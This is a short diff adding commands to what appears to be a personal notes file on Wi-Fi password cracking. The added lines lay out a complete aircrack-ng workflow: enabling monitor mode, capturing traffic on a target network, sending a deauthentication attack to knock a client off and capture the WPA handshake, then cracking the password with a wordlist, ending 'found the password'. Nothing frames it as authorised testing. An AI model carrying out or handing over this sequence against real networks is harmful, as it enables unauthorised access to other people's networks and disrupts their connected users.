@@ -32,6 +32,38 @@ $iwconfig
 
 *airmon-ng check kill
 
+*airmon-ng start wlan0
+
+*iwconfig
+
+*airodump-ng wlan0mon
+
+wireless channel
+
+$airodump-ng -c 6 --bssid (MAC Address) -w capture wlan0mon
+
+(Deauth attack)
+
+$aireplay-ng -0 1 -a  (MAC Address) -c (station) wlan0mon
+
+we got the handshake
+
+$ls capture*
+
+$gedit wordlist.txt
+
+$aircrack-ng -w wordlist.txt -b (MAC address) capture-02.cap
+
+found the password
+
+
+
+
+
+
+
+
+
 
 
 
